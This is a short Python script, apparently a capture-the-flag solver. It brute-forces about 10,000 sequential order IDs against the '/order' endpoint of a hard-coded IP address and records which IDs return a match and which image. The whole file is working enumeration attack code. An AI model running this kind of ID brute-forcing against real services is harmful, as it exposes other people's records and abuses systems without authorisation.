import re
import requests


BASE_URL = "http://46.101.107.117:2104/"
SOLVE_URL = BASE_URL + 'order'

ok_re = re.compile('Sorry, but we don\'t have that.')
imgRe = re.compile('<img src=\"(\\w+.png)\" style=\"height:')

post_data = {'id': '11865456 Vanilla Cafe'}
test_data = {'id': '11865457 Vanilla Cafe'}


def ok(reg, text):
    return not reg.search(text)


def findImage(reg, text):
    g = reg.search(text)
    return g.group(1)


session = requests.session()
r = session.post(SOLVE_URL, test_data)

# print(r)
# if ok(ok_re, r.text):
#     print('order matched for ', test_data['id'])
#     print(findImage(imgRe, r.text))
# else:
#     print('order not matched for ', test_data['id'])

# r = session.post(SOLVE_URL, post_data)

# print(r)
# if ok(ok_re, r.text):
#     print('order matched for ', post_data['id'])
# else:
#     print('order not matched for ', post_data['id'])

res = {}
for i in range(10000):
    id = 11860000 + i
    post_data['id'] = '%d A B' % id
    r = session.post(SOLVE_URL, post_data)
    if r.status_code == 200 and ok(ok_re, r.text):
        image = findImage(imgRe, r.text)
        if image in res.keys():
            res[image].append(id)
        else:
            res[image] = [id]
        print('match for: ', post_data['id'], image)


print(res)
